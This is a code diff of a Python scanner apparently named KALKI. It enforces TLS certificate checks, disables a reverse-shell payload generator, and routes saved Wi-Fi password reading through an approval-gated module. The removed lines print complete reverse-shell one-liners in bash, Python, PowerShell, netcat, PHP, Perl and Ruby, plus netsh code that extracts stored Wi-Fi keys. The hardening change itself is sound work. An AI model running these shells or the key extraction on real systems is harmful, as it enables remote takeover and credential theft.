@@ -447,8 +447,9 @@ def http_probe(url, timeout=10, max_bytes=120000):
             headers={"User-Agent": "Mozilla/5.0 KALKI defensive scanner"},
         )
         ctx = ssl.create_default_context()
-        ctx.check_hostname = False
-        ctx.verify_mode = ssl.CERT_NONE
+        # Enforce proper certificate validation to prevent MITM tampering
+        ctx.check_hostname = True
+        ctx.verify_mode = ssl.CERT_REQUIRED
         with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
             body = r.read(max_bytes).decode("utf-8", "replace")
             return {
@@ -726,56 +727,12 @@ def github_dorks(target):
 # ─────────────────────────────────────────────────────────────
 # REVERSE SHELL PAYLOADS
 # ─────────────────────────────────────────────────────────────
-def reverse_shell(shell_type, lhost, lport):
-    """Return a reverse shell one-liner for the given target."""
-    lhost = str(lhost)
-    lport = str(lport)
-    shells = {
-        "bash": "bash -i >& /dev/tcp/" + lhost + "/" + lport + " 0>&1",
-        "sh": "sh -i >& /dev/tcp/" + lhost + "/" + lport + " 0>&1",
-        "python": ("python -c 'import socket,subprocess,os;"
-                   "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
-                   's.connect(("' + lhost + '",' + lport + "));"
-                   "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
-                   "subprocess.call([\"/bin/sh\",\"-i\"])'"),
-        "python3": ("python3 -c 'import socket,subprocess,os;"
-                    "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
-                    's.connect(("' + lhost + '",' + lport + "));"
-                    "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
-                    "subprocess.call([\"/bin/sh\",\"-i\"])'"),
-        "powershell": ('powershell -nop -c "$client = New-Object '
-                       "System.Net.Sockets.TCPClient('" + lhost + "'," + lport +
-                       ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};"
-                       "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;"
-                       "$data = (New-Object -TypeName System.Text.ASCIIEncoding)."
-                       "GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );"
-                       "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
-                       "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
-                       "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};"
-                       '$client.Close()"'),
-        "nc": "nc -e /bin/sh " + lhost + " " + lport,
-        "ncmkfifo": ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " +
-                     lhost + " " + lport + " >/tmp/f"),
-        "php": ('php -r \'$sock=fsockopen("' + lhost + '",' + lport +
-                ');exec("/bin/sh -i <&3 >&3 2>&3");\''),
-        "perl": ('perl -e \'use Socket;$i="' + lhost + '";$p=' + lport +
-                 ';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));'
-                 'if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");'
-                 'open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\''),
-        "ruby": ('ruby -rsocket -e\'f=TCPSocket.open("' + lhost + '",' + lport +
-                 ').to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\''),
+def reverse_shell(shell_type=None, lhost=None, lport=None):
+    """Offensive payload generation is permanently removed in KALKI v1.5.0 for security compliance."""
+    return {
+        "ok": False,
+        "error": "Reverse shell payload generation is disabled in KALKI v1.5.0. KALKI endpoint defense supports only defensive reconnaissance and security posture analysis."
     }
-    # Friendly aliases
-    shells["mkfifo"] = shells["ncmkfifo"]
-    shells["ps"] = shells["powershell"]
-
-    key = str(shell_type).strip().lower()
-    if key == "list" or key == "available":
-        return {"available": list(shells.keys())}
-    if key not in shells:
-        return {"error": "Unknown shell type '" + str(shell_type) +
-                "'. Available: " + ", ".join(shells.keys())}
-    return {"type": key, "lhost": lhost, "lport": lport, "payload": shells[key]}
 
 
 # ─────────────────────────────────────────────────────────────
@@ -888,46 +845,20 @@ def ping(host: str) -> Dict[str, Any]:
 # WIFI RECON (Windows only)
 # ─────────────────────────────────────────────────────────────
 def wifi_profiles() -> List[str]:
-    """List all saved WiFi SSID profiles on this Windows machine."""
-    try:
-        result = subprocess.run(
-            ["netsh", "wlan", "show", "profiles"],
-            capture_output=True, text=True, timeout=10
-        )
-        profiles = []
-        for line in result.stdout.splitlines():
-            if "All User Profile" in line or "Current User Profile" in line:
-                parts = line.split(":", 1)
-                if len(parts) == 2:
-                    name = parts[1].strip()
-                    if name:
-                        profiles.append(name)
-        return profiles
-    except Exception:
+    """List the Wi-Fi networks saved on this Windows PC."""
+    import wifi_security
+    if not wifi_security.is_supported():
         return []
+    return [p["ssid"] for p in wifi_security.export_profiles() if p.get("ssid")]
 
 
 def wifi_password(ssid: str) -> Dict[str, str]:
-    """Extract the saved WiFi password for a given SSID on Windows."""
-    ssid = (ssid or "").strip()
-    if not ssid:
-        return {"error": "SSID required"}
-    try:
-        result = subprocess.run(
-            ["netsh", "wlan", "show", "profile", f"name={ssid}", "key=clear"],
-            capture_output=True, text=True, timeout=10
-        )
-        output = result.stdout
-        for line in output.splitlines():
-            if "Key Content" in line:
-                parts = line.split(":", 1)
-                if len(parts) == 2:
-                    password = parts[1].strip()
-                    return {"ssid": ssid, "password": password}
-        return {"ssid": ssid, "error": "password not found (profile may not exist or has no saved key)"}
-    except Exception as e:
-        return {"ssid": ssid, "error": str(e)}
-
+    """Read a saved key. The caller must get the user's approval first."""
+    import wifi_security
+    result = wifi_security.reveal_password(ssid)
+    if result.get("ok"):
+        return {"ssid": result["ssid"], "password": result["password"]}
+    return {"ssid": ssid, "error": result.get("error", "unknown error")}
 
 # ─────────────────────────────────────────────────────────────
 # CVE INTELLIGENCE (NIST NVD API v2.0)
